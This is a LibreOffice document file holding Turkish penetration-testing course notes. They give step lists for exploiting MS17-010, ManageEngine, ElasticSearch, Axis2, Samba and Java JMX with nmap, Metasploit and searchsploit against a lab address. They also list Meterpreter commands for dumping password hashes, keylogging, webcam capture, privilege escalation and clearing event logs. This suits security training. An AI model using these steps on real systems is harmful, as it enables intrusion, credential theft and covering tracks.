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color="#c9211e" loext:opacity="100%" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001b9890" officeooo:paragraph-rsid="001b9890" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001b9890" officeooo:paragraph-rsid="001b9890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224b12" loext:opacity="100%" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="001b9890" officeooo:paragraph-rsid="001b9890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4- EXPLOİT SALDIRILARI</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Nmap ve Metasploit ile MS17-010 Açık Tespiti</text:p>
      <text:p text:style-name="P2">nmap -sS -sV -p 445 –script vuln 10.10.10.11 -vv</text:p>
      <text:p text:style-name="P2">smb-vuln bul.</text:p>
      <text:p text:style-name="P2">msfconsole</text:p>
      <text:p text:style-name="P2">search ms17</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">MS17-010 Açığına Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">msfconsole</text:p>
      <text:p text:style-name="P2">search ms17</text:p>
      <text:p text:style-name="P2">ayarları yap.</text:p>
      <text:p text:style-name="P2">check</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Meterpreter Komutları</text:p>
      <text:p text:style-name="P2">sysinfo <text:s text:c="14"/>(sist. Bilgi)</text:p>
      <text:p text:style-name="P2">show_mount <text:s text:c="4"/>(bağlı disk gör.)</text:p>
      <text:p text:style-name="P2">idletime ve localtime</text:p>
      <text:p text:style-name="P2">shutdown veya reboot</text:p>
      <text:p text:style-name="P2">ipconfig</text:p>
      <text:p text:style-name="P2">portfwd <text:s text:c="6"/>(paket yönd.)</text:p>
      <text:p text:style-name="P2">route <text:s text:c="10"/>(rotaların görüntülenmesi veya değişimi)</text:p>
      <text:p text:style-name="P2">ps <text:s text:c="16"/>(çalışan işlemleri gör.)</text:p>
      <text:p text:style-name="P2">kill &lt;PID&gt; <text:s text:c="2"/>(işlemi durdurur)</text:p>
      <text:p text:style-name="P2">getpid <text:s text:c="5"/></text:p>
      <text:p text:style-name="P2">migrate &lt;PID&gt; <text:s text:c="3"/>(ilgili işlemi başka işlem arkasında çalıştırır)</text:p>
      <text:p text:style-name="P2">clearev <text:s text:c="17"/>(olay günlüğünü siler)</text:p>
      <text:p text:style-name="P2">shell <text:s text:c="21"/>(shell e geçer)</text:p>
      <text:p text:style-name="P2">help</text:p>
      <text:p text:style-name="P2">pwd <text:s text:c="5"/>(mevcut dizin)</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2">cd “<text:a xlink:type="simple" xlink:href="../../../../../c:/Program" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\Program</text:a> Files”</text:p>
      <text:p text:style-name="P2">cat, edit, rm, mkdir, rmdir</text:p>
      <text:p text:style-name="P2">execute -f &lt;dosya&gt; <text:s text:c="4"/>(çalıştırır <text:s/>-f dosya, -H gizle, -i çalıştır ve çağır)</text:p>
      <text:p text:style-name="P2">search -f &lt;dosya&gt; <text:s text:c="6"/>(dosyayı arar)</text:p>
      <text:p text:style-name="P2">download &lt;nesne&gt;&lt;dizin&gt;</text:p>
      <text:p text:style-name="P2">upload &lt;nesne&gt;&lt;dizin&gt;</text:p>
      <text:p text:style-name="P2">bg</text:p>
      <text:p text:style-name="P2">sessions -i &lt;ID&gt; <text:s text:c="12"/>(arkaya atılan ilgili ID li meterpreter ı öne getirir. Sessions -l de listeler)</text:p>
      <text:p text:style-name="P2">bgrun, bglist, bgkill</text:p>
      <text:p text:style-name="P2">getuid <text:s text:c="18"/>(bağlı oturumun yetki sınıfı gör.)</text:p>
      <text:p text:style-name="P2">getprivs <text:s text:c="15"/>(bağlı oturumda yetkilendirilmiş işlemleri gör.)</text:p>
      <text:p text:style-name="P2">getsystem -t 0 <text:s text:c="5"/>(bağlı kullanıcının yetkisini yükseltmeyi dener)</text:p>
      <text:p text:style-name="P2">reg &lt;komut&gt; <text:s text:c="6"/>(hedef sisteöin Registry sini yönetir.) (reg-h yardım)</text:p>
      <text:p text:style-name="P2">hashdump <text:s text:c="10"/>(şifre hash lerini görüntüler)</text:p>
      <text:p text:style-name="P2">webcam_list</text:p>
      <text:p text:style-name="P2">webcam_snap</text:p>
      <text:p text:style-name="P2">screenshot</text:p>
      <text:p text:style-name="P2">keyscan_start, keyscan_dump (rapor alır), keyscan_stop</text:p>
      <text:p text:style-name="P2">irb <text:s text:c="10"/>(metasploit scriptleri çağırabileceğimiz ortamı açar)</text:p>
      <text:p text:style-name="P2">run &lt;script&gt;</text:p>
      <text:p text:style-name="P2">load &lt;eklenti&gt; <text:s text:c="3"/>(load -l)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:soft-page-break/>Meterpreter ile Hedefte Sistem Keşfi</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>sisteme gir.</text:p>
      <text:p text:style-name="P2">Help</text:p>
      <text:p text:style-name="P2">sysinfo</text:p>
      <text:p text:style-name="P2">show_mount</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>idletime, localtime</text:p>
      <text:p text:style-name="P2">route</text:p>
      <text:p text:style-name="P2">ipconfig</text:p>
      <text:p text:style-name="P2">ps</text:p>
      <text:p text:style-name="P2">getpid</text:p>
      <text:p text:style-name="P2">ps -S cmd.exe</text:p>
      <text:p text:style-name="P2">kill 640</text:p>
      <text:p text:style-name="P2">ps -S cmd.exe</text:p>
      <text:p text:style-name="P2">shell</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Meterpreter ile Hedefte Dosya Dizin Yönetimi</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2">ls c:\\</text:p>
      <text:p text:style-name="P2">pwd</text:p>
      <text:p text:style-name="P2">cd c:\\”Program Files”</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2">cat desktop.ini</text:p>
      <text:p text:style-name="P2">edit desktop.ini</text:p>
      <text:p text:style-name="P2">execute -h</text:p>
      <text:p text:style-name="P2">execute -f cmd.exe</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>ps</text:p>
      <text:p text:style-name="P2">execute -f cmd.exe -H -i</text:p>
      <text:p text:style-name="P2">search -f cmd.exe</text:p>
      <text:p text:style-name="P2">download desktop.ini /root/Desktop/desktop.ini</text:p>
      <text:p text:style-name="P2">upload</text:p>
      <text:p text:style-name="P2">upload desktop.ini /root/Desktop/desktop.ini hacked</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2">rm hacked</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Exploit Araştırması</text:p>
      <text:p text:style-name="P2">nmap version arat</text:p>
      <text:p text:style-name="P2">manageengine desktop central arat.</text:p>
      <text:p text:style-name="P2">Ip port arat.</text:p>
      <text:p text:style-name="P2">Metasploit arat</text:p>
      <text:p text:style-name="P2">cve kodu arat</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">ManageEngine e Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">bulduğumuz metasploit exploiti kullan</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>ayarla</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">ElasticSearch e Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">nmap version arat</text:p>
      <text:p text:style-name="P2">üzerine git</text:p>
      <text:p text:style-name="P2">metasploit search</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Apache Axis2 ye Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">nmap arat</text:p>
      <text:p text:style-name="P2">http apache bul<text:line-break/>link port arat</text:p>
      <text:p text:style-name="P2">üzerine git</text:p>
      <text:p text:style-name="P2">search</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Samba ya Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">nmap arat</text:p>
      <text:p text:style-name="P2">üzerine git</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>search</text:p>
      <text:p text:style-name="P2">ayarla</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2">çalışmadı. </text:p>
      <text:p text:style-name="P2">Smb version detection arat</text:p>
      <text:p text:style-name="P2">versionu arat</text:p>
      <text:p text:style-name="P2">ayarla</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2">çalışmadı.</text:p>
      <text:p text:style-name="P2">Show payloads</text:p>
      <text:p text:style-name="P2">burdan meterpreter değil shell olanı arıyoruz (reverse_tcp)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Staged: <text:s text:c="2"/>(/)</text:p>
      <text:p text:style-name="P2">Boyutu küçük</text:p>
      <text:p text:style-name="P2">Stabil değil</text:p>
      <text:p text:style-name="P2">Stage in içinde çalışır</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Non-Staged: <text:s text:c="2"/>(_)</text:p>
      <text:p text:style-name="P2">Boyutu büyük</text:p>
      <text:p text:style-name="P2">Stabil</text:p>
      <text:p text:style-name="P2">Kendi çalışır</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Java JMX e Exploit Saldırısı</text:p>
      <text:p text:style-name="P2">nmap ara üzerine git.</text:p>
      <text:p text:style-name="P2">Java rmi bul</text:p>
      <text:p text:style-name="P2">üzerine git</text:p>
      <text:p text:style-name="P2">sonuç yok…</text:p>
      <text:p text:style-name="P2">metasploit</text:p>
      <text:p text:style-name="P2">java rmi arat.</text:p>
      <text:p text:style-name="P2">Firefoxdan arat </text:p>
      <text:p text:style-name="P2">locate *java*.nse</text:p>
      <text:p text:style-name="P2">locate *rmi*.nse</text:p>
      <text:p text:style-name="P2">bulduğumuz portları –script rmi* ile arat</text:p>
      <text:p text:style-name="P2">jmx bulduk</text:p>
      <text:p text:style-name="P2">metasploitte ilgili exploiti al</text:p>
      <text:p text:style-name="P2">ayarla</text:p>
      <text:p text:style-name="P2">run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1">Exploit Veritabanları ve Kaynakları</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://www.rapid7.com/db/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.rapid7.com/db/</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://en.0day.today/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://en.0day.today/</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://www.exploit-db.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.exploit-db.com/</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://packetstormsecurity.com/files/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://packetstormsecurity.com/files/</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://cxsecurity.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://cxsecurity.com/</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://vulners.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://vulners.com/</text:a></text:p>
      <text:p text:style-name="P2">https://www.vulnerability-lab.com/</text:p>
      <text:p text:style-name="P2">https://sploitus.com/</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Searchsploit ile Exploit-DB Kullanımı</text:p>
      <text:p text:style-name="P2">searchsploit ms17 –id -w</text:p>
      <text:p text:style-name="P2">--id <text:s text:c="3"/>(id verip bulabiliriz)</text:p>
      <text:p text:style-name="P2">-p <text:s text:c="6"/>(path)</text:p>
      <text:p text:style-name="P2">-v <text:s text:c="5"/>(verbose)</text:p>
      <text:p text:style-name="P2">-x <text:s text:c="6"/>(edit)</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>-m <text:s text:c="5"/>(bulunduğun dizine kopyalar)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Manuel Exploit ile Apache ye Saldırı-Linux</text:p>
      <text:p text:style-name="P2">nmap arattık</text:p>
      <text:p text:style-name="P2">http version apache olanın version bulduk</text:p>
      <text:p text:style-name="P2">searchsploit mod_ssl_2.8.4 –id -w</text:p>
      <text:p text:style-name="P2">bulup (2) olana gir</text:p>
      <text:p text:style-name="P2">id aldık</text:p>
      <text:p text:style-name="P2">searchsploit -m id</text:p>
      <text:p text:style-name="P2">gcc id.c -lcrypto -o mod_ssl_exploit</text:p>
      <text:p text:style-name="P2">ls</text:p>
      <text:p text:style-name="P2">./mod_ssl_exploit</text:p>
      <text:p text:style-name="P2">ilgili ayarı yap</text:p>
      <text:p text:style-name="P2">run</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Manuel Exploit ile Samba ya Saldırı-Linux</text:p>
      <text:p text:style-name="P2">nmap arat</text:p>
      <text:p text:style-name="P2">üzerine git</text:p>
      <text:p text:style-name="P2">version bulduk</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>searchsploit samba 2.2.1a –id -w</text:p>
      <text:p text:style-name="P2">searchsploit -m id</text:p>
      <text:p text:style-name="P2">gcc id.c -o smb_exploit</text:p>
      <text:p text:style-name="P2">./smb_exploit</text:p>
      <text:p text:style-name="P2">ayarla</text:p>
      <text:p text:style-name="P2">run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15:34:57.473771278</meta:creation-date>
    <dc:date>2022-09-01T16:25:16.987025844</dc:date>
    <meta:editing-duration>PT49M13S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="11" meta:paragraph-count="179" meta:word-count="504" meta:character-count="3763" meta:non-whitespace-character-count="3214"/>
  </office:meta>
</office:document-meta>
</file>